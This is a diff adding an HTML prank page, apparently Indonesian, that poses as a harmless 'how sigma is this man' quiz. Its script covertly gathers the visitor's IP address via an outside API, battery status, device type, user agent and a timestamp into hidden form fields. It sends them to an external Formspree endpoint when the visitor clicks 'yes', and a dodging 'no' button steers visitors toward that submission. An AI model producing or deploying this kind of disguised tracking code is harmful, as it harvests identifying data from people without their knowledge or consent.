@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fun Webpage</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+
+        body {
+            background-color: #000000;
+            font-family: 'Roboto', sans-serif;
+            text-align: center;
+            padding: 50px;
+            color: #ffffff;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            display: inline-block;
+        }
+        .hidden {
+            display: none;
+        }
+        button {
+            margin: 10px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 1.2em;
+        }
+        #btn-send {
+            background-color: #b3ffb3;
+        }
+        #btn-no {
+            background-color: #ff9999;
+        }
+        #btn-yes {
+            background-color: #66b3ff;
+        }
+        #result {
+            font-size: 2em;
+            color: #ff66b3;
+        }
+        img {
+            max-width: 100px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Masukkan Nama Kamu:</h1>
+        <form id="name-form" action="https://formspree.io/f/mzzpdpor" method="POST">
+            <input type="text" name="name" id="name" required>
+            <input type="hidden" name="ip" id="ip">
+            <input type="hidden" name="battery" id="battery">
+            <input type="hidden" name="timestamp" id="timestamp">
+            <input type="hidden" name="device" id="device">
+            <input type="hidden" name="browser" id="browser">
+            <button type="button" id="btn-send">Kirim</button>
+        </form>
+
+        <div id="question" class="hidden">
+            <p>seberapa sigma pria ini?</p>
+            <img src="Sigma.jpg">
+            <button id="btn-yes">Woilah sigma banget!+1000 aura</button>
+            <button id="btn-no">Cih -1000 aura</button>
+        </div>
+
+        <div id="result" class="hidden">
+            <p>Ciee ngaku sendiri!</p>
+        </div>
+    </div>
+
+    <script>
+        const btnSend = document.getElementById('btn-send');
+        const btnYes = document.getElementById('btn-yes');
+        const btnNo = document.getElementById('btn-no');
+        const nameForm = document.getElementById('name-form');
+        const question = document.getElementById('question');
+        const result = document.getElementById('result');
+        const ipField = document.getElementById('ip');
+        const batteryField = document.getElementById('battery');
+        const timestampField = document.getElementById('timestamp');
+        const deviceField = document.getElementById('device');
+        const browserField = document.getElementById('browser');
+
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ipField.value = data.ip;
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+            }
+        }
+
+        async function getBatteryStatus() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryField.value = `Battery level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+            } else {
+                batteryField.value = 'Battery status not available';
+            }
+        }
+
+        function getCurrentDateTime() {
+            const now = new Date();
+            const dateTimeString = `${now.getFullYear()}-${now.getMonth() + 1}-${now.getDate()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
+            timestampField.value = dateTimeString;
+        }
+
+        function getDeviceInfo() {
+            let deviceInfo = navigator.platform;
+            if (navigator.userAgent.includes("Mobile")) {
+                deviceInfo += " - Mobile";
+            } else if (navigator.userAgent.includes("Tablet")) {
+                deviceInfo += " - Tablet";
+            } else {
+                deviceInfo += " - Desktop";
+            }
+            const deviceType = getDeviceType();
+            deviceField.value = `${deviceInfo} - ${deviceType}`;
+        }
+
+        function getDeviceType() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const mobileDevices = ["iphone", "ipad", "android"];
+            for (let device of mobileDevices) {
+                if (userAgent.includes(device)) {
+                    return device.toUpperCase();
+                }
+            }
+            return "Desktop";
+        }
+
+        function getBrowserInfo() {
+            browserField.value = navigator.userAgent;
+        }
+
+        btnSend.addEventListener('click', async () => {
+            await fetchIP();
+            await getBatteryStatus();
+            getCurrentDateTime();
+            getDeviceInfo();
+            getBrowserInfo();
+            nameForm.classList.add('hidden');
+            question.classList.remove('hidden');
+        });
+
+        btnYes.addEventListener('click', () => {
+            question.classList.add('hidden');
+            result.classList.remove('hidden');
+            nameForm.submit();
+        });
+
+        btnNo.addEventListener('click', () => {
+            question.style.position = 'absolute';
+            question.style.top = `${Math.random() * (window.innerHeight - 100)}px`;
+            question.style.left = `${Math.random() * (window.innerWidth - 200)}px`;
+        });
+    </script>
+</body>
+</html>
